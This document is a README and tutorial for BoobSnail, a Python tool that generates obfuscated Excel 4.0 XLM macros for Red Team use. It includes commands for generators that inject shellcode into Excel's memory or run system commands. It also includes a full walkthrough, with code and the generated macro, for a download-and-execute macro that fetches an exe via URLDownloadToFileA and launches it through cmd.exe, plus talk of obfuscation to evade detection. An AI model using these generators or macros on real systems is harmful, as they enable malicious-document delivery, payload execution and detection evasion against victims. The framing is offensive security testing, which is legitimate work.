
BoobSnail - Excel 4.0 macro generator
Author: Marcin Ogorzelski, 25.05.2021

Excel 4.0 XLM macros are useful for the Red Team. But it is often the case that when using publicly available generators, samples are detected. Then you usually have to invent your own techniques or modify existing ones. Another problem is the Excel language. If the target's Excel is set to a language other than English and the obfuscated formulas are in English, the macro will not work after deobfuscation.

BoobSnail tries to solve these problems by sharing a library that allows implementing your own generators. BoobSnail has been split into several separate classes that work together (Excel4Macro, Excel4Translator, Excel4Obfuscator, Excel4Generator, Excel4AntiAnalysis). So you can replace or extend one class without changing the others. BoobSnail represents formulas, variables, cell values, and formulas arguments as python objects so it's easy to change some attributes such as reference styles (addressing style), addresses (for example spread cells across worksheet), translate formula (change name of formula) or replace cell with obfuscated one. In other words, you can easily make your generator more "dynamic". Thanks to BoobSnail you do not have to reinvent the wheel if you want to write an XLM macro generator.

Also, it is equipped with some predefined generators that could be used as an example or to generate samples for Red Team or Blue Team purposes. BoobSnail generators allow to generate obfuscated macro:

    injecting x86 and x64 shellcode into Excel process memory;
    running system command via EXEC formula.

How to use generator?
python boobsnail.py <generator> -h

To display available generators type:
python boobsnail.py
Examples

Generate obfuscated macro that injects x64 or x86 shellcode:
python boobsnail.py Excel4NtDonutGenerator --inputx86 <PATH_TO_SHELLCODE> --inputx64 <PATH_TO_SHELLCODE> --out boobsnail.csv

Generate obfuscated macro that runs calc.exe:
python boobsnail.py Excel4ExecGenerator --cmd "powershell.exe -c calc.exe" --out boobsnail.csv
Writting generator

Let's say that we want to write generator which generates macro that:

    downloads and saves exe file on the file system;
    runs downloaded exe file.

    First download boobsnail from Github.
    Create directory in excel4lib/generator for example excel4lib/generator/download_execute.
    Copy excel4lib/generator/template.txt to excel4lib/generator/download_execute/download_execute_generator.py
    Open excel4lib/generator/download_execute/download_execute_generator.py and replace {CLASS_NAME} with your name and {CLASS_DESC} with description of your generator.
    In excel4lib/generator/__init__.py import generator package:

from .download_execute import *

    Create excel4lib/generator/download_execute/__init__.py file and import generator file:

from .download_execute_generator import *

    In boobsnail.py add your generator class in generators variable:

generators = [Excel4NtDonutGenerator, Excel4ExecGenerator, Excel4DownloadExecuteGenerator]

    List available generators in boobsnail (you should see newly created generator):

python boobsnail.py
(venv) D:\pentest2\Tools\python\Toolset\Generators\excel4_generator>python boobsnail.py
___.                ___.     _________             .__.__
\_ |__   ____   ____\_ |__  /   _____/ ____ _____  |__|  |
 | __ \ /  _ \ /  _ \| __ \ \_____  \ /    \__  \ |  |  |
 | \_\ (  <_> |  <_> ) \_\ \/        \   |  \/ __ \|  |  |__
 |___  /\____/ \____/|___  /_______  /___|  (____  /__|____/
     \/                  \/        \/     \/     \/
     Author: @_mzer0 @stm_cyber
Usage: boobsnail.py <generator>
Generators:
Excel4NtDonutGenerator - Port of EXCELntDonut tool written by joeleonjr: https://github.com/FortyNorthSecurity/EXCELntDonut
Excel4ExecGenerator - Generates Excel4 Macro that allows to run system command via Exec formula.
Excel4DownloadExecuteGenerator - Downloads and executes EXE file

Excel4DownloadExecuteGenerator class overrides two methods:

    Excel4Generator.custom_args - allows adding custom command line arguments.
    Excel4Generator.generate_macro - generates macro. So this is the place where we will write a macro.

First, we need to define command line arguments. Some of the arguments are predefined in Excel4Generator class. For sure we require the user to pass the URL from which the exe file should be downloaded. To do this add the following line in the custom_args function:
self.args_parser.add_argument("--url", "-u", required=False, help="URL from which download EXE file")

self.args_parser property is object of ArgumentParser class from argparse library.

Run generator with the following command:
python boobsnail.py Excel4DownloadExecuteGenerator -h

You should see that the --url option has been added.
Now we can start writing a macro. Let's say that we want to write a generator for the following macro:
exepath="C:\Users\Public\test.exe"
=REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","DOWNLOAD","",1,9)
=DOWNLOAD(0,"http://127.0.0.1:8080/msg.exe",exepath,0,0)
args=CONCATENATE("/c ",exepath)
=REGISTER("Shell32","ShellExecuteA","JJCCCJJ","CMDRUN","",1,9)
=CMDRUN(0,"open","C:\Windows\System32\cmd.exe",args,0,5)

In above macro we are defining some variables, registering two WinAPI functions and calling them.

Excel4DownloadExecuteGenerator inherits macro object from Excel4Generator that is stored in self.macro property. This property holds a reference to the Excel4Macro object. This class allows creating formulas, variables, cell values, etc. The most important functions for creating a macro are listed below. Each of these functions returns a python object that represents the corresponding Excel 4.0 instruction. These objects could be used as arguments in other. To better understand this look at the following example:
macro = Excel4Macro("test.csv")
# Represents command="calc.exe"
cmd = macro.variable("command", "calc.exe")
# Represents =EXEC(command)
macro.formula("EXEC", cmd)

For the example above we have created a variable called command which is stored in the cmd python variable. Next, we can pass it as an argument to the macro.formula function.
Function name	Example call	Excel 4.0 instruction
Excel4Macro.formula(formula, *args)	Excel4Macro.formula("ALERT", 5)	=ALERT(5)
Excel4Macro.argument(formula, *args	Excel4Macro.argument("BITXOR", 15, 16)	BITXOR(15,16)
Excel4Macro.register(dll_name, exported_function, type_text, function_text)	Excel4Macro.register("urlmon", "URLDownloadToFileA", "JJCCJJ", "DOWNLOAD")	=REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","DOWNLOAD","",1,9)
Excel4Macro.value(value)	Excel4Macro.value("TEST")	TEST
Excel4Macro.variable(name, value)	Excel4Macro.variable("name", "value")	name="value"

To implement our macro we need to define variable exepath. To do this call the variable function on a macro object. This function returns a reference to a python object (Excel4Variable) that represents the Excel4 variable. As you already know Excel4 variable consists of name and value. So we need to pass the name and value to the variable call.
# Represents exepath="C:\Users\Public\test.exe"
exe_path = self.macro.variable("exepath", "C:\\Users\\Public\\test.exe")

Next, we need to import (register) URLDownloadToFileA function. To do this we need to create a REGISTER formula. Basically, we can achieve it in 2 ways. First, we can use the Excel4Macro.register function, which returns the Excel4RegisterFormula object representing the REGISTER formula
self.macro.register("urlmon", "URLDownloadToFileA", "JJCCJJ", "DOWNLOAD")

or we can use Excel4Macro.register_url_download_to_file_a function. Excel4Macro provides several functions that facilitate the registration of WinAPI functions.At the moment, the Excel4Macro class facilitates the registration of the following WinAPI functions: CreateThread, WriteProcessMemory, VirtualAlloc, NtTestAlert, RtlCopyMemory, QueueUserAPC and URLDownloadToFileA.
So in order to register URLDownloadToFileA function we can call Excel4Macro.register_url_download_to_file_a.
# Represents =REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","DOWNLOAD","",1,9)
download_call = self.macro.register_url_download_to_file_a("DOWNLOAD")

Next, we need to call the URLDownloadToFileA function which is represented in our macro as DOWNLOAD formula. To do this we need to create new formula.
# Represents =DOWNLOAD(0,"{URL_FROM_CMD_LINE}",exepath,0,0)
self.macro.formula("DOWNLOAD", 0, self.args.url, exe_path, 0, 0)

The above notation is correct, but when obfuscating WinAPI function names, it will cause one problem. If the DOWNLOAD formula changes its name, this name will not be changed in the formula. For this reason, we need to call the get_call_name function on the Excel4RegisterFormula object to make these names related. If the DOWNLOAD name is changed, all calls created in this way will also be changed. Look at the following example:
# Register URLDownloadToFileA at DOWNLOAD name
download_call = macro.register_url_download_to_file_a("DOWNLOAD")
# Call registered DOWNLOAD formula
f = macro.formula("DOWNLOAD", 0, "", "", 0, 0)
# It will produce following macro:
#=REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","DOWNLOAD","",1,9)
#=DOWNLOAD(0,"","",0,0)
# Change name from DOWNLOAD to GETFILE
download_call.set_function_text("GETFILE")
# It will produce following macro:
#=REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","GETFILE","",1,9);
# Note that name of this formula wasn't changed
#=DOWNLOAD(0,"","",0,0)
# If we create formula in this way:
download_call = macro.register_url_download_to_file_a("DOWNLOAD")
f = macro.formula(download_call.get_call_name(), 0, "", "", 0, 0)
# It will produce following macro:
#=REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","DOWNLOAD","",1,9)
#=DOWNLOAD(0,"","",0,0)
# Change name from DOWNLOAD to GETFILE
download_call.set_function_text("GETFILE")
# It will produce following macro:
#=REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","GETFILE","",1,9);
# Note that name of this formula was changed
#=GETFILE(0,"","",0,0)

So it should be:
# Represents =DOWNLOAD(0,"{URL_FROM_CMD_LINE}",exepath,0,0)
self.macro.formula(download_call.get_call_name(), 0, self.args.url, exe_path, 0, 0)

Now we would like to create Excel 4.0 variable with Excel4 formula as value (args=CONCATENATE("/c ",exepath)). To create a formula call that is treated as an argument we need to use Excel4Macro.argument function.
# Represents args=CONCATENATE("/c ",exepath)
shell_arg = self.macro.variable("args", self.macro.argument("CONCATENATE", "/c ", exe_path))

Rest of the code is created in the same way, here is full code:
def generate_macro(self):
  exe_path = self.macro.variable("exepath", "C:\\Users\\Public\\test.exe")
  download_call = self.macro.register_url_download_to_file_a("DOWNLOAD")
  self.macro.formula(download_call.get_call_name(), 0, self.args.url, exe_path, 0, 0)
  shell_arg = self.macro.variable("args", self.macro.argument("CONCATENATE", "/c ", exe_path))
  execute_call = self.macro.register_shell_execute("CMDRUN")
  self.macro.formula(execute_call.get_call_name(), 0, "open", "C:\\Windows\\System32\\cmd.exe", shell_arg, 0, 5)
  self.macro.to_csv_file(self.args.out)

If you are ready, try to run our newly created generator with the following command:
python boobsnail.py Excel4DownloadExecuteGenerator -u http://127.0.0.1:8080/msg.exe -do -o boobsnail.csv

Following macro should be created:
exepath="C:\Users\Public\test.exe";
=REGISTER("urlmon","URLDownloadToFileA","JJCCJJ","DOWNLOAD","",1,9);
=DOWNLOAD(0,"http://127.0.0.1:8080/msg.exe",exepath,0,0);
args=CONCATENATE("/c ",exepath);
=REGISTER("Shell32","ShellExecuteA","JJCCCJJ","CMDRUN","",1,9);
=CMDRUN(0,"open","C:\Windows\System32\cmd.exe",args,0,5);

You can generate obfuscated macro by removing -do flag.
